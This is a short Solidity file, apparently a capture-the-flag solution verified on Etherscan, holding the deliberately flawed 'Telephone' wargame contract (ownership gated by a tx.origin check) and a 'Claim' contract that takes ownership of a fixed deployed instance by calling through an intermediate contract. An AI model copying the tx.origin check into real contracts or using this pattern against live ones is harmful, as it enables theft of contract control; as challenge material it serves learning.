/**
 *Submitted for verification at Etherscan.io on 2023-06-13
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Claim {

  constructor() {
    Telephone(0x5446e3a38F70f8f9ead0968F81b20B0908AC8009).changeOwner(0x09C6ac862D12eAA54306fa3532e5c51Ae908fcA4);
  }
}